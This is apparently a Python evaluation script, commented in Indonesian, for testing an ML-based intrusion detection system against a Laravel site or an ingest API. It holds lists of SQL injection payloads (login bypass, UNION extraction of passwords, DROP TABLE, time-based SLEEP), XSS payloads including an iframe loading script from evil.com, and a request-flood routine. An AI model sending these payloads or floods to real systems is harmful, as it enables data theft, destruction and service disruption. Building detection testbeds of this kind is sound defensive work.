"""
Testbed Attack Generator & Evaluation Tool for NIDS Research.
Mendukung pengujian langsung ke NIDS Ingest API maupun End-to-End melalui Website Target (Laravel/PHP).
Digunakan untuk pengujian empiris, demonstrasi langsung, dan verifikasi akurasi model ML.
"""
import sys
import os
import time
import argparse
import requests

# Sampel Payload Uji Coba
BENIGN_QUERIES = [
    "/?search=laptop+asus+rog+strix&category=gaming",
    "/?filter=price_asc&author=O'Reilly+Media",
    "/?title=Looking+for+books+by+D'Angelo+or+Shakespeare",
    "/?brand=sony&sort=rating--high",
    "/?view=summary&lang=id",
    "/?status=health_check",
    "/?post_id=42&tag=machine-learning",
    "/?section=contact-support",
    "/?topic=network-security-basics",
    "/?doc=installation-guide"
]

SQLI_PAYLOADS = [
    "/?user=admin'--&pass=123",
    "/?product_id=1' OR '1'='1",
    "/?search=1 UNION SELECT null, username, password FROM users--",
    "/?profile_id=5; DROP TABLE logs--",
    "/?check=1 AND (SELECT 1 FROM (SELECT SLEEP(2))a)"
]

XSS_PAYLOADS = [
    "/?msg=<script>alert('XSS_POC')</script>",
    "/?name=<img src=x onerror=alert(document.cookie)>",
    "/?keyword=<svg/onload=alert(1)>",
    "/?url=javascript:alert('pwned')",
    "/?feedback=<iframe src='http://evil.com/hook.js'></iframe>"
]

def get_default_api_key():
    """Mengambil API key website aktif pertama dari database jika tersedia."""
    try:
        sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
        from app import app
        from models import Website
        with app.app_context():
            site = Website.query.filter_by(name='Rekam Medis ChaCha20').first()
            if not site:
                site = Website.query.first()
            if site:
                return site.api_key
    except Exception:
        pass
    return "nids_live_default_test_key"

def send_request(target_url, api_key, uri, web_target=None, method="GET", ip="192.168.1.105", post_body=""):
    """
    Jika web_target ditentukan (misal http://localhost:8000), request dikirim ke website target
    sehingga nids_agent.php menyadapnya secara live.
    Jika tidak, request dikirim langsung ke endpoint NIDS /api/ingest.
    """
    if web_target:
        dest_url = f"{web_target.rstrip('/')}{uri}"
        headers = {
            "User-Agent": "NIDS-Testbed-Attacker/1.0",
            "X-Attacker-IP": ip,
            "X-Forwarded-For": ip
        }
        try:
            resp = requests.get(dest_url, headers=headers, timeout=5)
            return resp.status_code, {"end_to_end": True, "http_status": resp.status_code}
        except Exception as e:
            return 0, {"error": str(e)}
    else:
        url = f"{target_url.rstrip('/')}/api/ingest"
        headers = {
            "X-NIDS-KEY": api_key,
            "User-Agent": "NIDS-Testbed-Attacker/1.0"
        }
        payload = {
            "ip_address": ip,
            "method": method,
            "request_uri": uri,
            "post_body": post_body,
            "status_code": 200,
            "response_time_ms": 12.5
        }
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=5)
            return resp.status_code, resp.json() if resp.status_code == 200 else {}
        except Exception as e:
            return 0, {"error": str(e)}

def run_benign_test(target, api_key, web_target=None):
    print("\n" + "="*65)
    print("▶ [PENGUJIAN BENIGN] Mengirim 10 Permintaan Sah (O'Reilly, tanda petik, slug)")
    print("="*65)
    passed = 0
    for uri in BENIGN_QUERIES:
        code, res = send_request(target, api_key, uri, web_target=web_target, ip="10.0.0.15")
        if web_target:
            status = f"HTTP {code} (Terkirim ke Website Laravel)"
            passed += 1 if code in [200, 302, 404] else 0
        else:
            tier2 = res.get('tier2_web', {})
            is_attack = tier2.get('is_attack', False)
            status = "PASSED (Normal)" if not is_attack else f"FALSE POSITIVE ({tier2.get('attack_type')})"
            if not is_attack:
                passed += 1
        print(f"[{code}] URI: {uri[:45]:<45} -> {status}")
        time.sleep(0.1)
    print(f"\nHasil Benign: {passed}/{len(BENIGN_QUERIES)} selesai diproses.")

def run_sqli_test(target, api_key, web_target=None):
    print("\n" + "="*65)
    print("▶ [PENGUJIAN SQL INJECTION] Mengirim 5 Muatan SQLi Riil")
    print("="*65)
    detected = 0
    for uri in SQLI_PAYLOADS:
        code, res = send_request(target, api_key, uri, web_target=web_target, ip="192.168.1.101")
        if web_target:
            status = f"HTTP {code} -> Disadap oleh nids_agent.php & Diteruskan ke NIDS"
            detected += 1
        else:
            tier2 = res.get('tier2_web', {})
            is_attack = tier2.get('is_attack', False)
            status = f"DETECTED ({tier2.get('attack_type')} - Conf: {tier2.get('confidence')}%)" if is_attack else "MISSED"
            if is_attack:
                detected += 1
        print(f"[{code}] URI: {uri[:45]:<45} -> {status}")
        time.sleep(0.15)
    print(f"\nHasil SQLi: {detected}/{len(SQLI_PAYLOADS)} muatan berhasil dikirim dan dianalisis.")

def run_xss_test(target, api_key, web_target=None):
    print("\n" + "="*65)
    print("▶ [PENGUJIAN XSS] Mengirim 5 Muatan XSS Riil")
    print("="*65)
    detected = 0
    for uri in XSS_PAYLOADS:
        code, res = send_request(target, api_key, uri, web_target=web_target, ip="192.168.1.102")
        if web_target:
            status = f"HTTP {code} -> Disadap oleh nids_agent.php & Diteruskan ke NIDS"
            detected += 1
        else:
            tier2 = res.get('tier2_web', {})
            is_attack = tier2.get('is_attack', False)
            status = f"DETECTED ({tier2.get('attack_type')} - Conf: {tier2.get('confidence')}%)" if is_attack else "MISSED"
            if is_attack:
                detected += 1
        print(f"[{code}] URI: {uri[:45]:<45} -> {status}")
        time.sleep(0.15)
    print(f"\nHasil XSS: {detected}/{len(XSS_PAYLOADS)} muatan berhasil dikirim dan dianalisis.")

def run_ddos_burst(target, api_key, web_target=None, count=60):
    print("\n" + "="*65)
    print(f"▶ [PENGUJIAN DDOS FLOODING] Mengirim {count} Request Cepat dari 1 Sumber")
    print("="*65)
    blocked = 0
    for i in range(count):
        code, res = send_request(target, api_key, f"/?flood={i}", web_target=web_target, ip="192.168.1.200")
        if not web_target:
            tier1 = res.get('tier1_ddos', {})
            if tier1.get('is_attack'):
                blocked += 1
        else:
            if code in [200, 429]:
                blocked += 1
        time.sleep(0.01)
    if not web_target:
        print(f"\nHasil DDoS: {blocked}/{count} request teridentifikasi anomali flooding oleh Tier 1 Rate Limiter!")
    else:
        print(f"\nHasil DDoS: {count} burst paket berhasil ditembakkan ke website target.")

def main():
    parser = argparse.ArgumentParser(description="NIDS Testbed Attack Generator & Verifier")
    parser.add_argument("--target", default="http://127.0.0.1:5000", help="Base URL server NIDS")
    parser.add_argument("--web-target", default=None, help="URL Website Laravel/Target (misal http://localhost:8000)")
    parser.add_argument("--api-key", default=None, help="Website API Key")
    parser.add_argument("--attacker-ip", default="192.168.1.105", help="IP Penyerang yang disimulasikan (default: 192.168.1.105)")
    parser.add_argument("--mode", default="all", choices=["all", "benign", "sqli", "xss", "ddos"], help="Mode pengujian")
    args = parser.parse_args()

    api_key = args.api_key or get_default_api_key()
    print("*"*65)
    print("           NIDS TESTBED EVALUATION RUNNER")
    print("*"*65)
    print(f"NIDS Ingest Server : {args.target}")
    if args.web_target:
        print(f"Target Web Server  : {args.web_target} (End-to-End via nids_agent.php)")
    else:
        print("Target Web Server  : Direct Ingest Mode")
    print(f"API Key Digunakan  : {api_key[:12]}...")
    print(f"Mode Pengujian     : {args.mode.upper()}")
    print("*"*65)

    if args.mode in ["all", "benign"]:
        run_benign_test(args.target, api_key, web_target=args.web_target)
    if args.mode in ["all", "sqli"]:
        run_sqli_test(args.target, api_key, web_target=args.web_target)
    if args.mode in ["all", "xss"]:
        run_xss_test(args.target, api_key, web_target=args.web_target)
    if args.mode in ["all", "ddos"]:
        run_ddos_burst(args.target, api_key, web_target=args.web_target)

    print("\n[OK] Rangkaian pengujian selesai. Silakan periksa Dasbor NIDS untuk melihat alert!")

if __name__ == "__main__":
    main()
